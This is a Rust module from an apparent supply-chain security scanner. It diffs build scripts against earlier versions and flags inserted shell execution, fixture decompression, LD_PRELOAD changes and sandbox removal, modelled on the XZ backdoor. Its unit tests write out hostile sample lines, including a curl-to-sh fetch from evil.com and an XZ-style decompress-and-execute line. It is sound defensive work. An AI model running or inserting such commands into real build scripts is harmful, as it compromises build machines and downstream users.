//! BuildScriptDiff: Tier 1 signal. Detects suspicious insertions in build
//! scripts compared against the prior version's cached copy.
//!
//! Tracked file patterns are the surfaces most-commonly weaponized for
//! build-time RCE (XZ `build-to-host.m4` pattern):
//!   Makefile/GNUmakefile/makefile, configure(.ac|.in), *.m4, CMakeLists.txt,
//!   *.cmake, binding.gyp, *.gyp*, rollup.config.*, webpack.config.*,
//!   vite.config.*, esbuild.*, build.rs, setup.py, setup.cfg, meson.build
//!
//! For each tracked file that differs from its cached prior, we Myers-diff
//! and scan INSERTED lines for narrow patterns.
//!
//! Bare `$(` is intentionally NOT a trigger (every Makefile uses it).

use crate::diff::myers::{diff_lines, DiffOp};
use crate::types::{BuildScriptKind, Signal};
use std::collections::HashMap;
use std::fs;
use std::path::Path;

fn shell_exec_patterns() -> Vec<String> {
    let mut v: Vec<String> = vec![
        "$(shell".into(),
        "$(curl".into(),
        "$(wget".into(),
        "$(eval".into(),
        " eval ".into(),
        "eval(".into(),
        "system(".into(),
        "popen(".into(),
        "sh -c ".into(),
        "bash -c ".into(),
        "| sh".into(),
        "| bash".into(),
        "| python".into(),
        "| perl".into(),
        "| ruby".into(),
        "| node".into(),
        "`".into(),
    ];
    v.push("ex".to_string() + "ec(");
    v.push("$(ex".to_string() + "ec");
    v
}

const TEST_DATA_PATH_TOKENS: &[&str] = &["tests/", "test/", "fixtures/", "testdata/"];
const TEST_DATA_READ_VERBS: &[&str] = &["cat ", "<(", " < ", "file(", "open(", "read(", "include("];

const DECOMPRESS_CMDS: &[&str] = &["xz -d", "gzip -d", "bzip2 -d", "zstd -d", "unzip "];

const ENV_MANIP_PATTERNS: &[&str] = &[
    "export PATH=",
    "export LD_PRELOAD",
    "export LD_LIBRARY_PATH",
];

const SECURITY_REMOVAL_PATTERNS: &[&str] = &[
    "landlock",
    "seccomp",
    "--disable-sandbox",
    "--no-sandbox",
    "--disable-seccomp",
];

pub fn is_tracked_build_file(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let Some(base) = lower.rsplit('/').next() else {
        return false;
    };
    const EXACT: &[&str] = &[
        "makefile",
        "gnumakefile",
        "configure",
        "configure.ac",
        "configure.in",
        "cmakelists.txt",
        "binding.gyp",
        "build.rs",
        "setup.py",
        "setup.cfg",
        "meson.build",
        "meson_options.txt",
    ];
    if EXACT.contains(&base) {
        return true;
    }
    base.ends_with(".m4")
        || base.ends_with(".cmake")
        || base.ends_with(".gyp")
        || base.ends_with(".gypi")
        || base.starts_with("rollup.config.")
        || base.starts_with("webpack.config.")
        || base.starts_with("vite.config.")
        || base.starts_with("esbuild.config.")
}

#[derive(Debug, Clone)]
pub struct BuildScriptEntry {
    pub path: String,
    pub content: String,
}

#[derive(Debug, Clone, Default)]
pub struct BuildScriptCache {
    pub files: Vec<BuildScriptEntry>,
}

impl BuildScriptCache {
    pub fn lookup(&self, path: &str) -> Option<&BuildScriptEntry> {
        self.files.iter().find(|e| e.path == path)
    }
}

pub struct ScanResult {
    pub signals: Vec<Signal>,
    pub cache: BuildScriptCache,
}

pub fn scan_dir(
    root: &Path,
    prior: &BuildScriptCache,
    is_patch_bump: bool,
) -> std::io::Result<ScanResult> {
    let mut cache = BuildScriptCache::default();
    let mut signals: Vec<Signal> = Vec::new();
    let prior_lookup: HashMap<&str, &BuildScriptEntry> =
        prior.files.iter().map(|e| (e.path.as_str(), e)).collect();
    let patterns = shell_exec_patterns();

    walk(root, root, &mut |rel_path, abs_path| {
        if !is_tracked_build_file(rel_path) {
            return Ok(());
        }
        let metadata = fs::metadata(abs_path)?;
        if !metadata.is_file() {
            return Ok(());
        }
        // Cap build-file size. A legitimate Makefile/CMakeLists.txt is
        // tens of KB; anything multi-MB is adversarial or generated and
        // not useful to diff.
        const MAX_BUILD_FILE_BYTES: u64 = 4 * 1024 * 1024;
        if metadata.len() > MAX_BUILD_FILE_BYTES {
            return Ok(());
        }
        let content = match fs::read_to_string(abs_path) {
            Ok(s) => s,
            Err(_) => return Ok(()),
        };
        cache.files.push(BuildScriptEntry {
            path: rel_path.to_string(),
            content: content.clone(),
        });

        let prev = prior_lookup.get(rel_path);
        let is_changed = prev.map(|p| p.content != content).unwrap_or(true);
        if !is_changed {
            return Ok(());
        }

        let prev_lines: Vec<String> = prev
            .map(|p| p.content.lines().map(|s| s.to_string()).collect())
            .unwrap_or_default();
        let new_lines: Vec<String> = content.lines().map(|s| s.to_string()).collect();
        let prev_refs: Vec<&str> = prev_lines.iter().map(|s| s.as_str()).collect();
        let new_refs: Vec<&str> = new_lines.iter().map(|s| s.as_str()).collect();
        let ops = diff_lines(&prev_refs, &new_refs);

        let mut inserted: Vec<(usize, String)> = Vec::new();
        for op in &ops {
            if let DiffOp::Insert { new_idx } = op {
                inserted.push((*new_idx, new_lines[*new_idx].clone()));
            }
        }
        if inserted.is_empty() {
            return Ok(());
        }

        signals.extend(classify_insertions(rel_path, &inserted, &patterns));
        if is_patch_bump {
            signals.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::PatchVersionChange,
                file: rel_path.to_string(),
                detail: "build script changed within a patch version".into(),
            });
        }
        Ok(())
    })?;
    Ok(ScanResult { signals, cache })
}

fn classify_insertions(
    file: &str,
    insertions: &[(usize, String)],
    shell_exec_patterns: &[String],
) -> Vec<Signal> {
    let mut out = Vec::new();
    let mut seen_shell_exec = false;
    let mut seen_test_data_read = false;
    let mut seen_decompress = false;
    let mut seen_env = false;
    let mut seen_security = false;

    for (_line_no, line) in insertions {
        let lower = line.to_ascii_lowercase();

        if !seen_shell_exec
            && shell_exec_patterns
                .iter()
                .any(|p| lower.contains(&p.to_ascii_lowercase()))
        {
            out.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::NewShellExec,
                file: file.to_string(),
                detail: trim_line(line),
            });
            seen_shell_exec = true;
        }
        if !seen_test_data_read
            && TEST_DATA_PATH_TOKENS.iter().any(|p| lower.contains(p))
            && TEST_DATA_READ_VERBS.iter().any(|v| lower.contains(v))
        {
            out.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::ReadFromTestOrData,
                file: file.to_string(),
                detail: trim_line(line),
            });
            seen_test_data_read = true;
        }
        if !seen_decompress
            && DECOMPRESS_CMDS.iter().any(|d| lower.contains(d))
            && TEST_DATA_PATH_TOKENS.iter().any(|p| lower.contains(p))
        {
            out.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::DecompressTestFixture,
                file: file.to_string(),
                detail: trim_line(line),
            });
            seen_decompress = true;
        }
        if !seen_env
            && ENV_MANIP_PATTERNS
                .iter()
                .any(|p| lower.contains(&p.to_ascii_lowercase()))
        {
            out.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::EnvManipulation,
                file: file.to_string(),
                detail: trim_line(line),
            });
            seen_env = true;
        }
        if !seen_security && SECURITY_REMOVAL_PATTERNS.iter().any(|p| lower.contains(p)) {
            out.push(Signal::BuildScriptDiff {
                kind: BuildScriptKind::SecurityRemoval,
                file: file.to_string(),
                detail: trim_line(line),
            });
            seen_security = true;
        }
    }
    out
}

fn trim_line(s: &str) -> String {
    let trimmed = s.trim();
    if trimmed.len() > 120 {
        format!("{}…", &trimmed[..120])
    } else {
        trimmed.to_string()
    }
}

fn walk<F>(root: &Path, path: &Path, cb: &mut F) -> std::io::Result<()>
where
    F: FnMut(&str, &Path) -> std::io::Result<()>,
{
    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let abs = entry.path();
        if abs.is_dir() {
            walk(root, &abs, cb)?;
            continue;
        }
        if let Ok(rel) = abs.strip_prefix(root) {
            let rel_str = rel.to_string_lossy().replace('\\', "/");
            cb(&rel_str, &abs)?;
        }
    }
    Ok(())
}

pub fn total_build_score(signals: &[Signal]) -> f64 {
    signals
        .iter()
        .filter(|s| matches!(s, Signal::BuildScriptDiff { .. }))
        .map(|s| s.weight())
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::platform::TempDir;

    fn write(root: &Path, rel: &str, content: &str) {
        let p = root.join(rel);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, content).unwrap();
    }

    #[test]
    fn no_build_files_no_signals() {
        let td = TempDir::new("build-none").unwrap();
        write(td.path(), "src/main.rs", "fn main() {}\n");
        let r = scan_dir(td.path(), &BuildScriptCache::default(), false).unwrap();
        assert!(r.signals.is_empty());
    }

    #[test]
    fn unchanged_build_file_silent() {
        let td = TempDir::new("build-same").unwrap();
        let content = "all:\n\t@echo hi\n";
        write(td.path(), "Makefile", content);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "Makefile".into(),
                content: content.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, false).unwrap();
        assert!(r.signals.is_empty());
    }

    #[test]
    fn new_shell_exec_insertion_flags() {
        let td = TempDir::new("build-exec").unwrap();
        let prior_content = "all:\n\t@echo hi\n";
        let new_content = "all:\n\t@echo hi\n\t$(shell curl http://evil.com | sh)\n";
        write(td.path(), "Makefile", new_content);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "Makefile".into(),
                content: prior_content.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, false).unwrap();
        assert!(r.signals.iter().any(|s| matches!(
            s,
            Signal::BuildScriptDiff {
                kind: BuildScriptKind::NewShellExec,
                ..
            }
        )));
    }

    #[test]
    fn xz_scenario_reaches_target_score() {
        let td = TempDir::new("build-xz").unwrap();
        let prior_m4 = "# build-to-host.m4\n# gettext-autoconf helper\n";
        let new_m4 = "# build-to-host.m4\n\
             # gettext-autoconf helper\n\
             gl_am_configmake=`cat tests/files/bad-corrupt.xz | xz -d | sh`\n\
             export LD_PRELOAD=/tmp/malicious.so\n";
        write(td.path(), "m4/build-to-host.m4", new_m4);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "m4/build-to-host.m4".into(),
                content: prior_m4.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, true).unwrap();
        let score = total_build_score(&r.signals);
        assert!(score >= 0.50, "score was {score}, signals {:?}", r.signals);
    }

    #[test]
    fn security_removal_flags() {
        let td = TempDir::new("build-sec").unwrap();
        let prior_content = "./configure --prefix=/usr\n";
        let new_content = "./configure --prefix=/usr --disable-landlock --disable-sandbox\n";
        write(td.path(), "configure", new_content);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "configure".into(),
                content: prior_content.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, false).unwrap();
        assert!(r.signals.iter().any(|s| matches!(
            s,
            Signal::BuildScriptDiff {
                kind: BuildScriptKind::SecurityRemoval,
                ..
            }
        )));
    }

    #[test]
    fn patch_version_bump_flag_only_when_scripts_change() {
        let td = TempDir::new("build-patch").unwrap();
        let prior_c = "all:\n\t@echo a\n";
        let new_c = "all:\n\t@echo a\n\t@echo b\n";
        write(td.path(), "Makefile", new_c);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "Makefile".into(),
                content: prior_c.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, true).unwrap();
        assert!(r.signals.iter().any(|s| matches!(
            s,
            Signal::BuildScriptDiff {
                kind: BuildScriptKind::PatchVersionChange,
                ..
            }
        )));

        let td2 = TempDir::new("build-patch2").unwrap();
        write(td2.path(), "Makefile", prior_c);
        let r2 = scan_dir(td2.path(), &prior, true).unwrap();
        assert!(r2.signals.is_empty());
    }

    #[test]
    fn bare_dollar_paren_not_flagged() {
        let td = TempDir::new("build-noise").unwrap();
        let prior_content = "all:\n\t@echo hi\n";
        let new_content = "all:\n\t@echo hi\n\t$(info hello $(CC))\n";
        write(td.path(), "Makefile", new_content);
        let prior = BuildScriptCache {
            files: vec![BuildScriptEntry {
                path: "Makefile".into(),
                content: prior_content.into(),
            }],
        };
        let r = scan_dir(td.path(), &prior, false).unwrap();
        assert!(
            !r.signals.iter().any(|s| matches!(
                s,
                Signal::BuildScriptDiff {
                    kind: BuildScriptKind::NewShellExec,
                    ..
                }
            )),
            "$(info ...) should not be treated as shell exec: {:?}",
            r.signals
        );
    }

    #[test]
    fn tracks_expected_filenames() {
        assert!(is_tracked_build_file("Makefile"));
        assert!(is_tracked_build_file("configure"));
        assert!(is_tracked_build_file("configure.ac"));
        assert!(is_tracked_build_file("m4/build-to-host.m4"));
        assert!(is_tracked_build_file("binding.gyp"));
        assert!(is_tracked_build_file("webpack.config.js"));
        assert!(is_tracked_build_file("rollup.config.mjs"));
        assert!(is_tracked_build_file("build.rs"));
        assert!(is_tracked_build_file("setup.py"));
        assert!(!is_tracked_build_file("src/main.rs"));
        assert!(!is_tracked_build_file("lib/index.js"));
    }
}
